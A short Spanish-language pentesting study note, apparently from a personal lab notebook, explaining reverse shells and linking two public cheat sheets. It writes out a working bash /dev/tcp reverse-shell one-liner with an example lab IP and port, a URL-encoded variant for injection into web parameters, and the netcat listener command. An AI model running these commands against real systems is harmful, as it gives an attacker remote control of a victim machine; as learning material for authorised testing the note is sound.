Una **reverse shell** sirve para que un atacante obtenga acceso remoto a una máquina víctima.  
La víctima inicia la conexión hacia el atacante, lo que **evade firewalls o NAT**, y le da al atacante una shell para ejecutar comandos remotamente.

--------

[Articulo con one liners que dan sirven para tirar la reverse shell](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
[Otro articulo de revershell en este saque de groovy](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#powershell)
El one liner que mas vamos a usar
```
bash -c 'bash -i >& /dev/tcp/IpNuestra/Puerto 0>&1'
Ejemplo: bash -c 'bash -i >& /dev/tcp/10.10.16.4/443 0>&1'
```

Aveces tenemos que probar poner los & directamente con url enconde por que se pueden mal interpretar con el codigo
```
bash -c 'bash -i >%26 /dev/tcp/IpNuestra/Puerto 0>%261'
Ejemplo: bash -c 'bash -i >%26 /dev/tcp/10.10.16.4/443 0>%261'
```

Mientras tenemos que estar en escucha con [[nc -nlvp 443]]
